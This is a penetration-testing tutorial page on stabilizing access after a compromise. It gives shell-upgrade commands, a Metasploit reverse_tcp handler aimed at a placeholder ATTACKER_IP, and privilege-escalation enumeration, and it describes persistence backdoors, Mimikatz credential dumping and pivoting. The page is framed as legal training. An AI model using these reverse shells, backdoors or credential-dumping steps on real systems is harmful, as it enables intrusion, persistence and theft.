---
layout: default
title: Stabilizing Access
permalink: /cybersecurity/stabilizing-access/
---

# Stabilizing Access 🔗

The fourth phase of the penetration testing methodology: converting a temporary, fragile foothold into a **stable, persistent** presence on the target system.

## What This Phase Is About

A raw shell from an exploit is often unstable and dies easily — a crash, a timeout, or a firewall reset kills your session. Stabilizing access means upgrading your shell, escalating privileges, and ensuring you can get back in even after a reboot.

## 1. Shell Stabilization

### Spawn a proper interactive shell
```bash
# Spawn a TTY from a Python one-liner (on the target)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then from your terminal, background the shell and set raw mode
# (Ctrl+Z, then:)
stty raw -echo; fg
export TERM=xterm
```

### Upgrade to a meterpreter-like session
- **Meterpreter** is Metasploit's in-memory payload that gives you a **stable, encrypted, feature-rich** session.
- It runs entirely in memory (no files written to disk), making it stealthy against many AV solutions.

```bash
# In msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
run

# Once you have the session:
sessions -i 1
sysinfo        # view target OS info
getuid         # current user
ps             # list running processes
```

## 2. Privilege Escalation

Gaining a stable foothold as a low-privilege user is rarely enough. Escalate to **root / SYSTEM / administrator**:

| Technique | Description |
|---|---|
| Misconfigured SUDO | `sudo -l` — binaries runnable as root without password |
| SUID binaries | `find / -perm -4000 2>/dev/null` |
| Kernel exploits | Unpatched kernel CVEs |
| Service misconfigurations | Weak service permissions, writable paths |
| Unattended credentials | Passwords in config files, bash history, env vars |
| Windows-specific | SeImpersonate tokens, Unquoted Service Paths, AlwaysInstallElevated |

**Automated enum helpers:**
- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) — Linux privilege escalation checker
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) — Windows privilege escalation checker
- [LinEnum](https://github.com/rebootuser/LinEnum)

## 3. Persistence & Backdoors

Stabilizing access also means **surviving reboots** — persistence techniques:

- **Cron jobs** — scheduled reverse shell reconnect (Linux)
- **Scheduled Tasks** — Windows equivalent
- **SSH keys** — drop an authorized key for passwordless re-entry
- **Service creation** — register a malicious service that auto-starts
- **Registry Run keys** — `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

> ⚠️ Always obtain **explicit written authorization** before deploying persistence during an engagement.

## 4. Lateral Movement

With stable access, pivot and expand:
- Dump credentials with **Mimikatz** (Windows) from memory
- Reuse passwords/hashes across machines (Pass-the-Hash)
- Access shared drives and internal services

## 5. Pivoting

Use your foothold as a **jump box** to reach internal networks invisible from the internet:
- **[Chisel](https://github.com/jpillora/chisel)** — fast TCP/UDP tunnel over HTTP
- **SSH dynamic port forwarding** — `ssh -D 1080 user@target`
- **Metasploit autoroute** — pivot routes via a Meterpreter session

## Practice Legally ✅

- **[TryHackMe](https://tryhackme.com/)** — Privilege escalation and persistence rooms
- **[Hack The Box](https://www.hackthebox.eu/)** — Realistic machines requiring full exploitation chains
- **[Windows / Linux local privesc rooms](https://tryhackme.com/path/outline/jrpenetrationtester)** on TryHackMe

## Next Steps

After stabilizing your access, learn how to [Clear Your Tracks](/cybersecurity/clearing-tracks/) to avoid detection.

[← Back to Cybersecurity Hub](/cybersecurity/)